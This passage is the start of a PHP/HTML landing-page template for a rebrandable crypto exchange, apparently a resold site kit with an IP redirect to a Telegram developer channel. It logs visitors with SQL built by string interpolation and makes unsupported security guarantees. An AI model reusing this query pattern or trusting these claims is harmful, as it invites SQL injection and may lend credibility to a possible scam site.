<?php
error_reporting(0);
session_start();
include '_config.php';

$dbV->query("INSERT INTO visitors (ip, timestamp) VALUES ('$ip', '$timestamp')");

if($ip == '91.227.40.133'){
    header("Location: https://t.me/cryptostudio_dev");
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Main — <?=getSettings('name', $db);?></title>
    <meta charset="UTF-8">
    <meta name="csrf-token" content="oApWA7q5sl9w8UYmjwCOajLcGIkfCS7ivonzuET7">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="description" content="<?=getSettings('name', $db);?> is more than just a Bitcoin trading platform. We offer different trading options, provides 24/7 customer support and high level of security is guaranteed. Come see why our cryptocurrency exchange is the best place to buy, sell, trade and learn about crypto.">
    <link rel="icon" type="image/png" href="/files/index/logo10.png">
    <link href="/files/index/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="/files/index/css2.css" rel="stylesheet">
    <link href="/files/index/css2_002.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="/files/index/main.css">
    <link rel="stylesheet" type="text/css" href="/files/index/custom.css">
    <script type="text/javascript">
        window.appName = "<?=getSettings('name', $db);?>";
        window.siteKey = "dffb79c3-1d77-4953-920e-ae75e94bc984";
        window.bb = "<?=getSettings('domain_cur', $db);?>";
        window.wbb = "binance.com";
        window.apibb = "<?=getSettings('1domain_cur', $db);?>";
    </script>
    <style>.slick-slider{-webkit-touch-callout:none;-webkit-tap-highlight-color:transparent;box-sizing:border-box;touch-action:pan-y;-webkit-user-select:none;-moz-user-select:none;user-select:none;-khtml-user-select:none}.slick-list,.slick-slider{display:block;position:relative}.slick-list{margin:0;overflow:hidden;padding:0}.slick-list:focus{outline:none}.slick-list.dragging{cursor:pointer;cursor:hand}.slick-slider .slick-list,.slick-slider .slick-track{transform:translateZ(0)}.slick-track{display:block;left:0;margin-left:auto;margin-right:auto;position:relative;top:0}.slick-track:after,.slick-track:before{content:"";display:table}.slick-track:after{clear:both}.slick-loading .slick-track{visibility:hidden}.slick-slide{display:none;float:left;height:100%;min-height:1px}[dir=rtl] .slick-slide{float:right}.slick-slide img{display:block}.slick-slide.slick-loading img{display:none}.slick-slide.dragging img{pointer-events:none}.slick-initialized .slick-slide{display:block}.slick-loading .slick-slide{visibility:hidden}.slick-vertical .slick-slide{border:1px solid transparent;display:block;height:auto}.slick-arrow.slick-hidden{display:none}</style>
    <style>@charset "UTF-8";.slick-loading .slick-list{background:#fff url(/assets3/img/ajax-loader.gif?fb6f3c230cb846e25247dfaa1da94d8f) 50% no-repeat}@font-face{font-family:slick;font-style:normal;font-weight:400;src:url(assets3/img/slick.eot?a4e97f5a2a64f0ab132323fbeb33ae29);src:url(assets3/img/slick.eot?a4e97f5a2a64f0ab132323fbeb33ae29?#iefix) format("embedded-opentype"),url(assets3/img/slick.woff?295183786cd8a138986521d9f388a286) format("woff"),url(assets3/img/slick.ttf?c94f7671dcc99dce43e22a89f486f7c2) format("truetype"),url(assets3/img/slick.svg?2630a3e3eab21c607e21576571b95b9d#slick) format("svg")}.slick-next,.slick-prev{border:none;cursor:pointer;display:block;font-size:0;height:20px;line-height:0;padding:0;position:absolute;top:50%;transform:translateY(-50%);width:20px}.slick-next,.slick-next:focus,.slick-next:hover,.slick-prev,.slick-prev:focus,.slick-prev:hover{background:transparent;color:transparent;outline:none}.slick-next:focus:before,.slick-next:hover:before,.slick-prev:focus:before,.slick-prev:hover:before{opacity:1}.slick-next.slick-disabled:before,.slick-prev.slick-disabled:before{opacity:.25}.slick-next:before,.slick-prev:before{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:#fff;font-family:slick;font-size:20px;line-height:1;opacity:.75}.slick-prev{left:-25px}[dir=rtl] .slick-prev{left:auto;right:-25px}.slick-prev:before{content:"←"}[dir=rtl] .slick-prev:before{content:"→"}.slick-next{right:-25px}[dir=rtl] .slick-next{left:-25px;right:auto}.slick-next:before{content:"→"}[dir=rtl] .slick-next:before{content:"←"}.slick-dotted.slick-slider{margin-bottom:30px}.slick-dots{bottom:-25px;display:block;list-style:none;margin:0;padding:0;position:absolute;text-align:center;width:100%}.slick-dots li{display:inline-block;margin:0 5px;padding:0;position:relative}.slick-dots li,.slick-dots li button{cursor:pointer;height:20px;width:20px}.slick-dots li button{background:transparent;border:0;color:transparent;display:block;font-size:0;line-height:0;outline:none;padding:5px}.slick-dots li button:focus,.slick-dots li button:hover{outline:none}.slick-dots li button:focus:before,.slick-dots li button:hover:before{opacity:1}.slick-dots li button:before{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:#000;content:"•";font-family:slick;font-size:6px;height:20px;left:0;line-height:20px;opacity:.25;position:absolute;text-align:center;top:0;width:20px}.slick-dots li.slick-active button:before{color:#000;opacity:.75}</style>
    <style>@charset "UTF-8";@font-face{font-family:Notification;font-style:normal;font-weight:400;src:url(assets3/img/notification.eot?3657084dc0419605a91c99b81968c9d4);src:url(assets3/img/notification.eot?3657084dc0419605a91c99b81968c9d4?#iefixs3g3t9) format("embedded-opentype"),url(assets3/img/notification.woff?c392cd33d9d9de730f9d5c95e42b7c84) format("woff"),url(assets3/img/notification.ttf?c5d9251ea82e42f753810b4ef9764720) format("truetype"),url(assets3/img/notification.svg?5d0158671dd860c714c4424237520eb8#notification) format("svg")}.notification-container{max-height:calc(100% - 30px);overflow-x:hidden;overflow-y:auto;padding:0 15px;position:fixed;right:0;top:0;width:320px;z-index:999999}.notification,.notification-container{box-sizing:border-box}.notification{background-color:#ccc;border-radius:2px;box-shadow:0 0 12px #999;color:#fff;cursor:pointer;font-size:1em;line-height:1.2em;margin-top:15px;opacity:.9;padding:15px 15px 15px 58px;position:relative}.notification .title{font-size:1em;font-weight:700;line-height:1.2em;margin:0 0 5px}.notification:focus,.notification:hover{opacity:1}.notification-enter{transform:translate3d(100%,0,0);visibility:hidden}.notification-enter.notification-enter-active{transition:all .4s}.notification-enter.notification-enter-active,.notification-exit{transform:translateZ(0);visibility:visible}.notification-exit.notification-exit-active{transform:translate3d(100%,0,0);transition:all .4s;visibility:hidden}.notification:before{display:block;font-family:Notification;font-size:28px;height:28px;left:15px;line-height:28px;margin-top:-14px;position:absolute;text-align:center;top:50%;width:28px}.notification-info{background-color:#2f96b4}.notification-info:before{content:""}.notification-success{background-color:#51a351}.notification-success:before{content:""}.notification-warning{background-color:#f89406}.notification-warning:before{content:""}.notification-error{background-color:#bd362f}.notification-error:before{content:""}</style>
    <style data-styled="active" data-styled-version="5.3.3"></style>
</head>
<body>
<div id="root">
    <div class="app">
        <header>
            <div class="header-container">
                <div class="left-block">
                    <a class="logo" href="/"><img src="files/index/logo10.png" class="logo-image" alt=""><span class="logo-text"><?=getSettings('name', $db);?></span></a>
                    <nav class="header-nav"><a class="nav-element nl" href="/trade">Trade</a><a class="nav-element nl" href="/terms">Terms of Use</a><a class="nav-element nl" href="/privacy">Privacy Policy</a><a class="nav-element nl" href="/risk">Risk Warnings</a></nav>
                </div>
                <div class="right-block" style="width: 170px;">
                    <a class="blue-button sign-up" href="/register">Sign up</a><a class="grey-button login" href="/login">Login</a>
                    <div></div>
                    <div class="burger" style="background-image: url(&quot;/assets3/img/burger-menu.svg&quot;);"></div>
                </div>
            </div>
        </header>
        <div class="burger-menu" style="left: 100%;">
            <nav class="burger-navigation"><a class="burger-nav__element grey body1" href="/trade">Trade</a><a class="burger-nav__element grey body1" href="/terms">Terms of Use</a><a class="burger-nav__element grey body1" href="/privacy">Privacy Policy</a><a class="burger-nav__element grey body1" href="/login">Login</a><a class="burger-nav__element grey body1" href="/register">Sign up</a></nav>
        </div>